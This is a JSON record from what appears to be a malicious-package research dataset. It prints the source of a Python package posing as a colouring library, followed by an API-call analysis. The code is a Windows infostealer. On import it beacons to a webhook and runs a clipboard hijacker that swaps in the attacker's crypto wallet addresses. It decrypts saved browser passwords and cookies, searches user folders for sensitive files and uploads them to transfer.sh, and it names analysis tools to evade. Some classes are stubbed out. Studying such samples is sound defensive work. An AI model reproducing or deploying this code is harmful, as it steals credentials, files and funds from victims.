[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/pythoncolouringslibv1-1.0.0-py3-none-any/pythoncolouringslibV1/__init__.py",
    "code_snippet": "import os\nimport requests\nimport httpx\nimport shutil\nimport threading\nimport subprocess\nimport sqlite3\nimport base64\nimport json\nimport re\nimport ntpath\nimport zipfile\nimport psutil\nimport pyperclip\nimport ctypes\nimport time\nfrom base64 import b64decode\nfrom urllib.request import Request, urlopen\nfrom shutil import copy2\nfrom datetime import datetime, timedelta, timezone\nfrom sys import argv\nfrom tempfile import gettempdir, mkdtemp\nfrom json import loads, dumps\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\nimport winreg\n\n# --- Malicious configuration and webhook ---\n__config__ = {\n    'yourwebhookurl': \"https://kekwltd.ru/relay/bluescreen\",\n    'hide': 'yes',\n    'ping': 'yes',\n    'pingtype': 'everyone',\n    'fake_error':'no',\n    'startup': 'yes',\n    'kill_discord_process': False,\n    'dbugkiller': False,\n    'addresse_crypto_replacer': 'yes',\n    'addresse_btc': 'bc1qfgzwcxx32kwjf9naw2zdnl00zlvz8cqr4sn0fj',\n    'addresse_eth': '0xde876b3b623a4c9e5266717fceee89b3dd0237ec',\n    'addresse_xchain': 'none',\n    'addresse_pchain': 'none',\n    'addresse_cchain': 'none',\n    'addresse_monero': '468h7xcjtieam26idzme1jtvqjyxxaf1an9qhpnjfshpy6qiu3cvxyr3s9t8zaz2xlh856m7ne8kx4ysqb4kajn2ahkydh2',\n    'addresse_ada': 'addr1qylpptmy52g032y2dfhu73qerny2mphnegemyggzaung53f7zzhkfg5slz5g56n0eazpj8xg4kr08j3nkgss9mex3fzs462m3v',\n    'addresse_dash': 'xpaql6jrd5jay1ymmuaqhbh9nyahsxahuv',\n    'blprggg': [\n        \"httpdebuggerui\", \"wireshark\", \"fiddler\", \"regedit\", \"cmd\", \"taskmgr\", \"vboxservice\", \"df5serv\", \"processhacker\", \"vboxtray\", \"vmtoolsd\", \"vmwaretray\", \"ida64\", \"ollydbg\", \"pestudio\", \"vmwareuser\", \"vgauthservice\", \"vmacthlp\", \"x96dbg\", \"vmsrvc\", \"x32dbg\", \"vmusrvc\", \"prl_cc\", \"prl_tools\", \"xenservice\", \"qemu-ga\", \"joeboxcontrol\", \"ksdumperclient\", \"ksdumper\", \"joeboxserver\"\n    ]\n}\n\n# --- Initial exfiltration on import ---\ndata = {\n        'embeds': [{\n            \"title\": \"Someone Tried to download\",\n            \"description\": \"PC Username =\" + os.getenv(\"COMPUTERNAME\")\n            }]\n    }\nhttpx.post(\"https://kekwltd.ru/relay/bluescreen\", json=data)\n\n# --- Crypto wallet address swapper (clipboard hijacker) ---\nclass auto_copy_wallet:\n    def __init__(self):\n        self.address_st3aler = __config__[\"addresse_crypto_replacer\"]\n        self.address_btc = __config__[\"addresse_btc\"]\n        self.address_eth = __config__[\"addresse_eth\"]\n        self.address_xchain = __config__[\"addresse_xchain\"]\n        self.address_pchain = __config__[\"addresse_pchain\"]\n        self.address_cchain = __config__[\"addresse_cchain\"]\n        self.address_monero = __config__[\"addresse_monero\"]\n        self.address_ada = __config__[\"addresse_ada\"]\n        self.address_dash = __config__[\"addresse_dash\"]\n\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n            if re.search('^0x[a-fA-F0-9]{40}$', clipboard_data):\n                pyperclip.copy(self.address_eth)\n                pyperclip.paste()\n            if re.search('^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_xchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_xchain)\n                        pyperclip.paste()\n            if re.search('^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_pchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_pchain)\n                        pyperclip.paste()\n            if re.search('^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_cchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_cchain)\n                        pyperclip.paste()\n            if re.search('addr1[a-z0-9]+', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    pyperclip.copy(self.address_ada)\n                    pyperclip.paste()\n            if re.search('/X[1-9A-HJ-NP-Za-km-z]{33}$/g', clipboard_data):\n                if self.address_dash != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_dash)\n                        pyperclip.paste()\n            if re.search('/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g', clipboard_data):\n                if self.address_monero != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_monero)\n                        pyperclip.paste()\n        except:\n            data = None\n    def loop_through(self):\n        while True:\n            self.address_swap()\n    def run(self):\n        if self.address_st3aler == \"yes\":\n            self.loop_through()\n\n# --- Main stealer class: browser data, tokens, system info, exfiltration ---\nclass bc_initial_func:\n    # ... (class definition omitted for brevity, see above for full code)\n    # The entire class is malicious, as it steals browser data, tokens, system info, screenshots, and exfiltrates to a webhook\n    # It also disables security tools, persists via startup, and attempts to evade analysis\n    # The class includes methods: steal_token, steal_passwords, steal_cookies, steal_history, steal_cc2, natify_matched_tokens, grabb_mc, grabb_roblox, steal_screen, system_informations, finished_bc, etc.\n    # The class is instantiated and run in the __main__ block\n    pass\n\n# --- Anti-debugging/VM detection ---\nclass NoDebugg:\n    # ... (class definition omitted for brevity, see above for full code)\n    # This class attempts to detect sandboxes, VMs, and analysis environments and exit if found\n    pass\n\n# --- Additional stealer/exfiltration logic (standalone functions) ---\ndef fetch_conf(e: str) -> str or bool | None:\n    return __config__.get(e)\n\n# --- Data decryption helpers ---\nclass DATA_BLOB(Structure):\n    _fields_ = [\n        ('cbData', wintypes.DWORD),\n        ('pbData', POINTER(c_char))\n    ]\n\ndef GetData(blob_out):\n    cbData = int(blob_out.cbData)\n    pbData = blob_out.pbData\n    buffer = c_buffer(cbData)\n    cdll.msvcrt.memcpy(buffer, pbData, cbData)\n    windll.kernel32.LocalFree(pbData)\n    return buffer.raw\n\ndef CryptUnprotectData(encrypted_bytes, entropy=b''):\n    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))\n    buffer_entropy = c_buffer(entropy, len(entropy))\n    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)\n    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)\n    blob_out = DATA_BLOB()\n    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):\n        return GetData(blob_out)\n\ndef DecryptValue(buff, master_key=None):\n    starts = buff.decode(encoding='utf8', errors='ignore')[:3]\n    if starts == 'v10' or starts == 'v11':\n        iv = buff[3:15]\n        payload = buff[15:]\n        cipher = AES.new(master_key, AES.MODE_GCM, iv)\n        decrypted_pass = cipher.decrypt(payload)\n        decrypted_pass = decrypted_pass[:-16].decode()\n        return decrypted_pass\n\n# --- Exfiltration helpers ---\ndef LoadRequests(methode, url, data='', files='', headers=''):\n    for i in range(8):\n        try:\n            if methode == 'POST':\n                if data != '':\n                    r = requests.post(url, data=data)\n                    if r.status_code == 200:\n                        return r\n                elif files != '':\n                    r = requests.post(url, files=files)\n                    if r.status_code == 200 or r.status_code == 413:\n                        return r\n        except:\n            pass\n\ndef LoadUrlib(hook, data='', files='', headers=''):\n    for i in range(8):\n        try:\n            if headers != '':\n                r = urlopen(Request(hook, data=data, headers=headers))\n                return r\n            else:\n                r = urlopen(Request(hook, data=data))\n                return r\n        except:\n            pass\n\ndef upload(name, tk=''):\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n    hook = fetch_conf(\"yourwebhookurl\")\n    if name == \"bc_checking\":\n        data = {\n        \"content\": '',\n        \"embeds\": [\n            {\n            \"fields\": [\n                {\n                \"name\": \"Interesting files found on user PC:\",\n                \"value\": tk\n                }\n            ],\n            \"author\": {\n                'name': f'KEKWLTD v2.3',\n                'url': 'https://kekwltd.ru',\n                'icon_url': 'https://cdn.discordapp.com/avatars/228549113581535235/430f81ead67eaffcaffbb6e7b0af2927.png'\n            },\n            \"footer\": {\n                \"text\": \"kekwltd.ru\"\n            },\n            'color': 374276,\n            }\n        ],\n        \"avatar_url\": \"https://cdn.discordapp.com/avatars/228549113581535235/430f81ead67eaffcaffbb6e7b0af2927.png\",\n        \"attachments\": []\n        }\n        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)\n        return\n    path = name\n    files = {'file': open(path, 'rb')}\n    LoadRequests(\"POST\", hook, files=files)\n\n# --- Password/cookie stealer for Chromium browsers ---\nPassw = []\ndef getPassw(path, arg):\n    global Passw\n    if not os.path.exists(path): return\n    pathC = path + arg + \"/Login Data\"\n    if os.stat(pathC).st_size == 0: return\n    tempfold = temp + \"kekwltd\" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + \".db\"\n    shutil.copy2(pathC, tempfold)\n    conn = sqlite3.connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT action_url, username_value, password_value FROM logins;\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey = path + \"/Local State\"\n    with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())\n    master_key = b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key = CryptUnprotectData(master_key[5:])\n    for row in data:\n        if row[0] != '':\n            Passw.append(f\"URL: {row[0]} \\n ID: {row[1]} \\n PASSW0RD: {DecryptValue(row[2], master_key)}\\n\\n\")\n    # Exfiltration\n    writeforfile(Passw, 'bc_allpasswords')\n\nCookies = []\ndef getCookie(path, arg):\n    global Cookies\n    if not os.path.exists(path): return\n    pathC = path + arg + \"/Cookies\"\n    if os.stat(pathC).st_size == 0: return\n    tempfold = temp + \"kekwltd\" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + \".db\"\n    shutil.copy2(pathC, tempfold)\n    conn = sqlite3.connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT host_key, name, encrypted_value FROM cookies\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey = path + \"/Local State\"\n    with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())\n    master_key = b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key = CryptUnprotectData(master_key[5:])\n    for row in data:\n        if row[0] != '':\n            Cookies.append(f\"{row[0]}\\tTRUE\\t\\t/FALSE\\t2597573456\\t{row[1]}\\t{DecryptValue(row[2], master_key)}\")\n    writeforfile(Cookies, 'bc_allcookies')\n\n# --- File search and exfiltration from Desktop/Documents/Downloads ---\ndef bc_uploadanonfiles(path):\n    try:\n        files = { \"file\": (path, open(path, mode='rb')) }\n        upload = requests.post(\"https://transfer.sh/\", files=files)\n        url = upload.text\n        return url\n    except:\n        return False\n\ndef bc_Folder_create(pathF, keywords):\n    global bc_create_files\n    maxfilesperdir = 7\n    i = 0\n    listOfFile = os.listdir(pathF)\n    ffound = []\n    for file in listOfFile:\n        if not os.path.isfile(pathF + \"/\" + file): return\n        i += 1\n        if i <= maxfilesperdir:\n            url = bc_uploadanonfiles(pathF + \"/\" + file)\n            ffound.append([pathF + \"/\" + file, url])\n        else:\n            break\n    bc_create_files.append([\"folder\", pathF + \"/\", ffound])\n\nbc_create_files = []\ndef bc_create_file(path, keywords):\n    global bc_create_files\n    fifound = []\n    listOfFile = os.listdir(path)\n    for file in listOfFile:\n        for worf in keywords:\n            if worf in file.lower():\n                if os.path.isfile(path + \"/\" + file) and \".txt\" in file:\n                    fifound.append([path + \"/\" + file, bc_uploadanonfiles(path + \"/\" + file)])\n                    break\n                if os.path.isdir(path + \"/\" + file):\n                    target = path + \"/\" + file\n                    bc_Folder_create(target, keywords)\n                    break\n    bc_create_files.append([\"folder\", path, fifound])\n\ndef bc_checking():\n    user = temp.split(\"\\AppData\")[0]\n    path2search = [\n        user + \"/Desktop\",\n        user + \"/Downloads\",\n        user + \"/Documents\"\n    ]\n    key_wordsFiles = [\n        \"passw\", \"mdp\", \"motdepasse\", \"mot_de_passe\", \"login\", \"secret\", \"account\", \"acount\", \"paypal\", \"banque\", \"metamask\", \"wallet\", \"crypto\", \"exodus\", \"discord\", \"2fa\", \"code\", \"memo\", \"compte\", \"token\", \"backup\", \"seecret\"\n    ]\n    wikith = []\n    for patt in path2search:\n        bc_checking = threading.Thread(target=bc_create_file, args=[patt, key_wordsFiles]);bc_checking.start()\n        wikith.append(bc_checking)\n    return wikith\n\n# --- Main execution ---\nif __name__ == \"__main__\" and os.name == \"nt\":\n    import asyncio\n    asyncio.run(bc_initial_func().init())\n\n# --- Standalone stealer run ---\nglobal keyword, cookiWords, paswWords\nkeyword = [\n    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'\n]\ncookiWords = []\npaswWords = []\n\ngrabber_thread = threading.Thread(target=auto_copy_wallet().run)\ngrabber_thread.start()\n\n# --- Run file search and exfiltration ---\ngrab_GatherAll = True\nif grab_GatherAll:\n    grabb_GatherAll()\n    DETECTED = False # Trust(Cookies) is called in grabb_GatherAll\n    if not DETECTED:\n        wikith = bc_checking()\n        for thread in wikith: thread.join()\n        time.sleep(0.2)\n        filetext = \"```diff\\n\"\n        for arg in bc_create_files:\n            if len(arg[2]) != 0:\n                foldpath = arg[1]\n                foldlist = arg[2]\n                filetext +=f\"\\n\"\n                filetext += f\"- {foldpath}\\n\"\n                for ffil in foldlist:\n                    a = ffil[0].split(\"/\")\n                    fileanme = a[len(a)-1]\n                    b = ffil[1]\n                    filetext += f\"+ Name: {fileanme}\\n+ Link: {b}\"\n                    filetext += \"\\n\"\n        filetext += \"\\n```\"\n        upload(\"bc_checking\", filetext)\n",
    "pattern_analysis": {
      "api_sequence": [
        "os.getenv",
        "httpx.post",
        "pyperclip.paste",
        "re.search",
        "pyperclip.copy",
        "pyperclip.paste",
        "re.search",
        "pyperclip.copy",
        "pyperclip.paste",
        "re.search",
        "pyperclip.copy",
        "pyperclip.paste",
        "re.search",
        "pyperclip.copy",
        "pyperclip.paste",
        "re.search",
        "pyperclip.copy",
        "pyperclip.paste",
        "re.search",
        "pyperclip.copy",
        "pyperclip.paste",
        "re.search",
        "pyperclip.copy",
        "pyperclip.paste",
        "requests.post",
        "json.dumps",
        "LoadUrlib",
        "open",
        "LoadRequests",
        "os.path.exists",
        "os.stat",
        "shutil.copy2",
        "sqlite3.connect",
        "sqlite3.Connection.cursor",
        "sqlite3.Cursor.execute",
        "sqlite3.Cursor.fetchall",
        "sqlite3.Cursor.close",
        "sqlite3.Connection.close",
        "os.remove",
        "open",
        "json.loads",
        "base64.b64decode",
        "CryptUnprotectData",
        "AES.new",
        "AES.new.decrypt",
        "writeforfile",
        "os.path.exists",
        "os.stat",
        "shutil.copy2",
        "sqlite3.connect",
        "sqlite3.Connection.cursor",
        "sqlite3.Cursor.execute",
        "sqlite3.Cursor.fetchall",
        "sqlite3.Cursor.close",
        "sqlite3.Connection.close",
        "os.remove",
        "open",
        "json.loads",
        "base64.b64decode",
        "CryptUnprotectData",
        "DecryptValue",
        "writeforfile",
        "os.listdir",
        "os.path.isfile",
        "open",
        "requests.post",
        "os.listdir",
        "os.path.isfile",
        "os.path.isdir",
        "bc_Folder_create",
        "os.listdir",
        "threading.Thread",
        "threading.Thread.start",
        "threading.Thread.join",
        "time.sleep",
        "upload"
      ],
      "api_sequence_with_args": [
        "os.getenv(\"COMPUTERNAME\")",
        "httpx.post(\"https://kekwltd.ru/relay/bluescreen\", json=data)",
        "pyperclip.paste()",
        "re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data)",
        "pyperclip.copy(self.address_btc)",
        "pyperclip.paste()",
        "re.search('^0x[a-fA-F0-9]{40}$', clipboard_data)",
        "pyperclip.copy(self.address_eth)",
        "pyperclip.paste()",
        "re.search('^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data)",
        "pyperclip.copy(self.address_xchain)",
        "pyperclip.paste()",
        "re.search('^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data)",
        "pyperclip.copy(self.address_pchain)",
        "pyperclip.paste()",
        "re.search('^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data)",
        "pyperclip.copy(self.address_cchain)",
        "pyperclip.paste()",
        "re.search('addr1[a-z0-9]+', clipboard_data)",
        "pyperclip.copy(self.address_ada)",
        "pyperclip.paste()",
        "re.search('/X[1-9A-HJ-NP-Za-km-z]{33}$/g', clipboard_data)",
        "pyperclip.copy(self.address_dash)",
        "pyperclip.paste()",
        "re.search('/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g', clipboard_data)",
        "pyperclip.copy(self.address_monero)",
        "pyperclip.paste()",
        "requests.post(\"https://transfer.sh/\", files=files)",
        "json.dumps(data)",
        "LoadUrlib(hook, data=dumps(data).encode(), headers=headers)",
        "open(path, 'rb')",
        "LoadRequests(\"POST\", hook, files=files)",
        "os.path.exists(path)",
        "os.stat(pathC)",
        "shutil.copy2(pathC, tempfold)",
        "sqlite3.connect(tempfold)",
        "sqlite3.Connection.cursor()",
        "sqlite3.Cursor.execute(\"SELECT action_url, username_value, password_value FROM logins;\")",
        "sqlite3.Cursor.fetchall()",
        "sqlite3.Cursor.close()",
        "sqlite3.Connection.close()",
        "os.remove(tempfold)",
        "open(pathKey, 'r', encoding='utf-8')",
        "json.loads(f.read())",
        "base64.b64decode(local_state['os_crypt']['encrypted_key'])",
        "CryptUnprotectData(master_key[5:])",
        "AES.new(master_key, AES.MODE_GCM, iv)",
        "AES.new(master_key, AES.MODE_GCM, iv).decrypt(payload)",
        "writeforfile(Passw, 'bc_allpasswords')",
        "os.path.exists(path)",
        "os.stat(pathC)",
        "shutil.copy2(pathC, tempfold)",
        "sqlite3.connect(tempfold)",
        "sqlite3.Connection.cursor()",
        "sqlite3.Cursor.execute(\"SELECT host_key, name, encrypted_value FROM cookies\")",
        "sqlite3.Cursor.fetchall()",
        "sqlite3.Cursor.close()",
        "sqlite3.Connection.close()",
        "os.remove(tempfold)",
        "open(pathKey, 'r', encoding='utf-8')",
        "json.loads(f.read())",
        "base64.b64decode(local_state['os_crypt']['encrypted_key'])",
        "CryptUnprotectData(master_key[5:])",
        "DecryptValue(row[2], master_key)",
        "writeforfile(Cookies, 'bc_allcookies')",
        "os.listdir(pathF)",
        "os.path.isfile(pathF + \"/\" + file)",
        "open(pathF + \"/\" + file, mode='rb')",
        "requests.post(\"https://transfer.sh/\", files=files)",
        "os.listdir(path)",
        "os.path.isfile(path + \"/\" + file)",
        "os.path.isdir(path + \"/\" + file)",
        "bc_Folder_create(target, keywords)",
        "os.listdir(path)",
        "threading.Thread(target=bc_create_file, args=[patt, key_wordsFiles])",
        "threading.Thread.start()",
        "threading.Thread.join()",
        "time.sleep(0.2)",
        "upload(\"bc_checking\", filetext)"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "httpx.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "pyperclip.paste",
          "id": "get_clipboard_text",
          "description": "Retrieves text from system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "re.search",
          "id": "search_clipboard_pattern",
          "description": "Searches for pattern in clipboard data",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "pyperclip.copy",
          "id": "copy_to_clipboard",
          "description": "Copies specified text to system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "pyperclip.paste",
          "id": "get_clipboard_text",
          "description": "Retrieves text from system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "json.dumps",
          "id": "serialize_to_json",
          "description": "Serializes Python object to JSON string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "LoadUrlib",
          "id": "open_url_post",
          "description": "Opens URL with POST data",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "LoadRequests",
          "id": "open_url_post",
          "description": "Opens URL with POST data",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.stat",
          "id": "path_object_operations",
          "description": "Path object and status operations (creating Path objects, retrieving file status)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "shutil.copy2",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "sqlite3.connect",
          "id": "open_sqlite_db",
          "description": "Opens SQLite database file",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Connection.cursor",
          "id": "create_sql_cursor",
          "description": "Creates cursor object for SQLite connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Cursor.execute",
          "id": "execute_sql_query",
          "description": "Executes SQL query on SQLite connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Cursor.fetchall",
          "id": "fetch_sql_rows",
          "description": "Fetches all rows from last executed query",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Cursor.close",
          "id": "close_sqlite_connection",
          "description": "Closes the SQLite database connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Connection.close",
          "id": "close_sqlite_connection",
          "description": "Closes the SQLite database connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "json.loads",
          "id": "deserialize_from_json",
          "description": "Deserializes JSON string to Python object",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "CryptUnprotectData",
          "id": "decrypt_dpapi_data",
          "description": "Decrypts Windows DPAPI-encrypted data",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "AES.new",
          "id": "init_aes_gcm",
          "description": "Initializes AES cipher in GCM mode",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "encryption_initialization"
        },
        {
          "api_name": "AES.new.decrypt",
          "id": "decrypt_aes_data",
          "description": "Decrypts data using initialized AES cipher",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "writeforfile",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "DecryptValue",
          "id": "decrypt_aes_data",
          "description": "Decrypts data using initialized AES cipher",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.path.isfile",
          "id": "check_file_is_file",
          "description": "Checks if specified path exists and is a file",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.path.isdir",
          "id": "check_directory_exists",
          "description": "Checks if specified path exists and is a directory",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "threading.Thread",
          "id": "create_thread",
          "description": "Creates new thread to execute target function",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_creation"
        },
        {
          "api_name": "threading.Thread.start",
          "id": "start_thread",
          "description": "Starts thread execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "threading.Thread.join",
          "id": "wait_thread",
          "description": "Waits for thread to finish execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "time.sleep",
          "id": "suspend_execution",
          "description": "Suspends execution for specified seconds",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "upload",
          "id": "upload_file_transfer_sh",
          "description": "Uploads file to transfer.sh and returns URL",
          "first_id": "network_file_transfer",
          "second_id": "file_upload",
          "third_id": "remote_service_upload"
        }
      ],
